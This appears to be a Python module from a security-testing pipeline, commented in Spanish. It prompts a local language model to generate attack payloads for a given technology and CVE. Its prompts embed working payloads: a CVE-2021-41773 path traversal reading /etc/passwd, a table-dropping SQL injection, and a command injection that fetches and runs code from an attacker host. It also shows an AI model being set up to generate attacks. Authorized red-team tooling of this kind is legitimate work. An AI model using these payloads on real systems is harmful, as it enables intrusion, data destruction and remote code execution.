"""
FASE 5 — Agente Fuzzer Adaptativo.

Genera payloads ofensivos dinámicamente con el mismo modelo local
(Qwen2.5-1.5B-Instruct-bnb-4bit) que ya carga la Capa 2 del Validador
Híbrido (security/validator.py), evitando una segunda carga en VRAM.

La salida se fuerza vía JSON-constrained decoding (outlines) a un único
campo `payload`, exactamente por la misma razón que en el validador: un
modelo de 1.5B es propenso a envolver la respuesta en explicaciones o
Markdown si se le pide texto libre, así que el esquema Pydantic es lo que
garantiza que `generate_payload()` devuelva ÚNICAMENTE el string del
payload, nunca prosa alrededor.
"""

from __future__ import annotations

from typing import Any

from pydantic import BaseModel


class _PayloadOutput(BaseModel):
    payload: str


class AdaptiveFuzzer:
    # Prompts few-shot: un modelo de 1.5B sin ejemplos concretos tiende a
    # "vaguear" con placeholders genéricos (ej. "exploit_code") en vez de un
    # payload real. Los ejemplos anclan tanto el formato (string de payload
    # crudo, no una descripción) como el nivel de especificidad esperado.
    _AGGRESSIVE_SYSTEM_PROMPT = (
        "Eres un generador de payloads ofensivos para un ejercicio de Red Team "
        "autorizado. Dada una tecnología y un CVE, produce UN payload agresivo "
        "de explotación (RCE o SQL injection con mutación de estado) adaptado a "
        "esa tecnología específica. El payload debe ser una cadena de ataque "
        "real y concreta (ruta, cadena SQL o comando), NUNCA una descripción "
        "ni un placeholder genérico como 'exploit_code' o 'payload_here'.\n\n"
        "Ejemplos de referencia (mismo formato esperado, adapta al CVE/tecnología dados):\n"
        "- Apache HTTP Server 2.4.49, CVE-2021-41773 (path traversal + RCE vía cgi-bin) -> "
        "payload: \"/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd\"\n"
        "- MySQL/genérico, SQLi con mutación -> payload: \"'; DROP TABLE users;--\"\n"
        "- Aplicación con shell expuesto -> payload: \"$(curl http://attacker/x|sh)\"\n\n"
        "Responde EXCLUSIVAMENTE con el JSON del esquema solicitado, campo "
        "`payload`, sin explicación ni Markdown."
    )

    _PASSIVE_SYSTEM_PROMPT = (
        "Eres un generador de payloads de reconocimiento para un ejercicio de "
        "Red Team autorizado. Dada una tecnología y un CVE, produce UN payload "
        "pasivo de solo lectura (ej. lectura de versión, banner grabbing, sleep "
        "de confirmación no destructivo) adaptado a esa tecnología específica. "
        "El payload debe ser una cadena concreta y ejecutable, NUNCA una "
        "descripción ni un placeholder genérico.\n\n"
        "Ejemplos de referencia (mismo formato esperado, adapta al CVE/tecnología dados):\n"
        "- Apache HTTP Server, verificación de versión -> payload: \"/server-status\"\n"
        "- Parámetro numérico genérico -> payload: \"id=1\"\n"
        "- Confirmación de inyección sin efecto destructivo -> payload: \"1' AND SLEEP(3)--\"\n\n"
        "Responde EXCLUSIVAMENTE con el JSON del esquema solicitado, campo "
        "`payload`, sin explicación ni Markdown."
    )

    # Payload de reserva si el modelo no está disponible o falla la inferencia
    # (fail-safe: nunca se bloquea el pipeline por una excepción del LLM, pero
    # tampoco se inventa nada fuera de esquema).
    _FALLBACK_AGGRESSIVE = "' OR 1=1--"
    _FALLBACK_PASSIVE = "id=1"

    def __init__(self, model: Any = None, tokenizer: Any = None) -> None:
        # Modelo/tokenizer inyectados: la misma instancia ya cargada para el
        # Validador Híbrido (Capa 2), reutilizada aquí sin duplicar VRAM.
        self._model = model
        self._tokenizer = tokenizer

    def generate_payload(self, technology: str, cve: str, aggressive: bool) -> str:
        if self._model is None:
            return self._FALLBACK_AGGRESSIVE if aggressive else self._FALLBACK_PASSIVE

        system_prompt = self._AGGRESSIVE_SYSTEM_PROMPT if aggressive else self._PASSIVE_SYSTEM_PROMPT
        prompt = (
            f"{system_prompt}\n\n"
            f"Tecnología: {technology}\n"
            f"CVE: {cve}\n\n"
            "JSON:"
        )

        try:
            import outlines

            outlines_model = outlines.from_transformers(self._model, self._tokenizer)
            generator = outlines.Generator(outlines_model, _PayloadOutput)
            raw = generator(prompt, max_new_tokens=120)
            result = _PayloadOutput.model_validate_json(raw) if isinstance(raw, str) else raw
        except Exception:
            return self._FALLBACK_AGGRESSIVE if aggressive else self._FALLBACK_PASSIVE

        payload = result.payload.strip()
        if not payload:
            return self._FALLBACK_AGGRESSIVE if aggressive else self._FALLBACK_PASSIVE
        return payload
